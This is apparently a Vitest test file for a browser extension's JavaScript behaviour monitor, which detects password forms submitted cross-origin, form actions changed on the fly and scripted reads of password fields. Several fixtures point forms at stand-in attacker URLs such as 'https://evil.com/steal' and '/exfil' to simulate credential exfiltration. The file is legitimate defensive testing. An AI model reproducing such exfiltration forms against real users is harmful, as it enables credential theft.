// @vitest-environment happy-dom
import { describe, expect, it, beforeEach, vi } from "vitest";
import {
  formHasCredentialFields,
  isCrossOriginUrl,
  extractOrigin,
  correlatesWithFormSubmit,
  createEmptyState,
  isStateExpired,
  JS_BEHAVIOR_STATE_TTL_MS,
  CREDENTIAL_READ_DEBOUNCE_MS,
  initJsBehaviorMonitor,
  _resetState,
} from "../extension/src/content/js_behavior_monitor";

beforeEach(() => {
  _resetState();
  document.body.innerHTML = "";
});

describe("formHasCredentialFields", () => {
  it("returns true when form has password input", () => {
    const form = document.createElement("form");
    const input = document.createElement("input");
    input.type = "password";
    form.appendChild(input);
    expect(formHasCredentialFields(form)).toBe(true);
  });

  it("returns false when form has no password input", () => {
    const form = document.createElement("form");
    const input = document.createElement("input");
    input.type = "text";
    form.appendChild(input);
    expect(formHasCredentialFields(form)).toBe(false);
  });

  it("returns false for empty form", () => {
    const form = document.createElement("form");
    expect(formHasCredentialFields(form)).toBe(false);
  });

  it("detects nested password fields", () => {
    const form = document.createElement("form");
    const div = document.createElement("div");
    const input = document.createElement("input");
    input.type = "password";
    div.appendChild(input);
    form.appendChild(div);
    expect(formHasCredentialFields(form)).toBe(true);
  });
});

describe("isCrossOriginUrl", () => {
  it("returns false for same-origin URL", () => {
    expect(isCrossOriginUrl(location.origin + "/path")).toBe(false);
  });

  it("returns true for different origin", () => {
    expect(isCrossOriginUrl("https://evil.com/steal")).toBe(true);
  });

  it("returns false for relative URL", () => {
    expect(isCrossOriginUrl("/login")).toBe(false);
  });

  it("returns false for empty string", () => {
    expect(isCrossOriginUrl("")).toBe(false);
  });

  it("returns false for invalid URL", () => {
    expect(isCrossOriginUrl("not a url ::: ///")).toBe(false);
  });

  it("returns true for different port", () => {
    expect(isCrossOriginUrl("http://localhost:9999/path")).toBe(true);
  });
});

describe("extractOrigin", () => {
  it("extracts origin from absolute URL", () => {
    expect(extractOrigin("https://example.com/path?q=1")).toBe("https://example.com");
  });

  it("returns empty for empty input", () => {
    expect(extractOrigin("")).toBe("");
  });

  it("resolves relative URL against current origin", () => {
    const result = extractOrigin("/relative/path");
    expect(result).toBe(location.origin);
  });

  it("handles URL that resolves to current origin", () => {
    // ":::invalid" is treated as a relative path by URL constructor
    expect(extractOrigin(":::invalid")).toBe(location.origin);
  });
});

describe("correlatesWithFormSubmit", () => {
  it("returns false with no recent form submits", () => {
    expect(correlatesWithFormSubmit(Date.now())).toBe(false);
  });

  it("returns true after credential form submit within window", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(correlatesWithFormSubmit(Date.now())).toBe(true);
  });
});

describe("createEmptyState", () => {
  it("returns zeroed state", () => {
    const state = createEmptyState();
    expect(state.score).toBe(0);
    expect(state.lastSignalTs).toBe(0);
    expect(state.signalCounts.formSubmitSuspicious).toBe(0);
  });
});

describe("isStateExpired", () => {
  it("returns true for empty state", () => {
    expect(isStateExpired(createEmptyState())).toBe(true);
  });

  it("returns false for recent state", () => {
    const state = createEmptyState();
    state.lastSignalTs = Date.now();
    expect(isStateExpired(state)).toBe(false);
  });

  it("returns true when past TTL", () => {
    const state = createEmptyState();
    state.lastSignalTs = Date.now() - JS_BEHAVIOR_STATE_TTL_MS - 1;
    expect(isStateExpired(state)).toBe(true);
  });
});

describe("initJsBehaviorMonitor form submit detection", () => {
  it("emits signal for cross-origin credential form submit", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        hasCredentialFields: true,
        isCrossOrigin: true,
        destinationOrigin: "https://evil.com",
      })
    );
  });

  it("does not emit signal for same-origin form submit", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "/login";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).not.toHaveBeenCalled();
  });

  it("does not emit signal when mode is off", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "off", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).not.toHaveBeenCalled();
  });

  it("emits signal for non-credential form with dynamically changed action", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.setAttribute("action", "/safe-endpoint");
    document.body.appendChild(form);

    // Dynamically change the action to a cross-origin URL
    form.action = "https://evil.com/exfil";

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-form-submit-suspicious",
      expect.objectContaining({
        actionDynamicallyChanged: true,
      })
    );
  });
});

describe("isCrossOriginUrl – data/javascript/blob URIs", () => {
  it("returns false for data: URIs", () => {
    expect(isCrossOriginUrl("data:text/html,<h1>hi</h1>")).toBe(false);
  });

  it("returns false for javascript: URIs", () => {
    expect(isCrossOriginUrl("javascript:void(0)")).toBe(false);
  });

  it("returns false for blob: URIs", () => {
    expect(isCrossOriginUrl("blob:https://example.com/abc-123")).toBe(false);
  });

  it("returns false for data: with leading whitespace", () => {
    expect(isCrossOriginUrl("  data:text/html,x")).toBe(false);
  });
});

describe("correlatesWithFormSubmit – bounds checking", () => {
  it("returns false when request timestamp is before the submit", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    form.action = "https://evil.com/steal";
    const pw = document.createElement("input");
    pw.type = "password";
    form.appendChild(pw);
    document.body.appendChild(form);

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    // Request timestamp earlier than the submit — negative delta
    expect(correlatesWithFormSubmit(0)).toBe(false);
  });
});

describe("credential field value monitoring", () => {
  it("emits signal when password field value is read outside submit", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    const input = document.createElement("input");
    input.type = "password";
    form.appendChild(input);
    document.body.appendChild(form);

    // Set value directly on the element
    input.value = "secret123";

    // Read it back — this should trigger the credential read signal
    const _val = input.value;
    void _val;

    expect(postSignal).toHaveBeenCalledWith(
      "ns-js-credential-read",
      expect.objectContaining({
        isInsideSubmitHandler: false,
        fieldCount: 1,
      })
    );
  });

  it("does not emit signal for non-password fields", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const input = document.createElement("input");
    input.type = "text";
    document.body.appendChild(input);

    input.value = "hello";
    const _val = input.value;
    void _val;

    expect(postSignal).not.toHaveBeenCalledWith(
      "ns-js-credential-read",
      expect.anything()
    );
  });

  it("does not emit signal when password value is empty", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);

    // Value is empty string, reading it should not trigger
    const _val = input.value;
    void _val;

    expect(postSignal).not.toHaveBeenCalledWith(
      "ns-js-credential-read",
      expect.anything()
    );
  });

  it("debounces rapid credential reads on the same field", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);

    input.value = "secret";

    // First read triggers
    void input.value;
    expect(postSignal).toHaveBeenCalledTimes(1);

    // Second immediate read is debounced
    void input.value;
    expect(postSignal).toHaveBeenCalledTimes(1);
  });

  it("emits again after debounce window expires", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);

    input.value = "secret";

    const baseTime = Date.now();
    vi.spyOn(Date, "now").mockReturnValue(baseTime);
    void input.value;
    expect(postSignal).toHaveBeenCalledTimes(1);

    // Advance past debounce window
    vi.spyOn(Date, "now").mockReturnValue(baseTime + CREDENTIAL_READ_DEBOUNCE_MS + 1);
    void input.value;
    expect(postSignal).toHaveBeenCalledTimes(2);

    vi.restoreAllMocks();
  });

  it("does not emit during form submit flow", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });

    const form = document.createElement("form");
    const input = document.createElement("input");
    input.type = "password";
    form.appendChild(input);
    document.body.appendChild(form);

    input.value = "secret";

    // Add a submit handler that reads the password value
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      void input.value;
    });

    form.dispatchEvent(new Event("submit", { bubbles: true }));

    // The credential read signal should not have fired (form submit context)
    const credReadCalls = postSignal.mock.calls.filter(
      (c: [string, unknown]) => c[0] === "ns-js-credential-read"
    );
    expect(credReadCalls).toHaveLength(0);
  });

  it("does not emit when mode is off", () => {
    const postSignal = vi.fn();
    initJsBehaviorMonitor({ debug: false, mode: "off", postSignal });

    const input = document.createElement("input");
    input.type = "password";
    document.body.appendChild(input);

    input.value = "secret";
    void input.value;

    expect(postSignal).not.toHaveBeenCalled();
  });
});
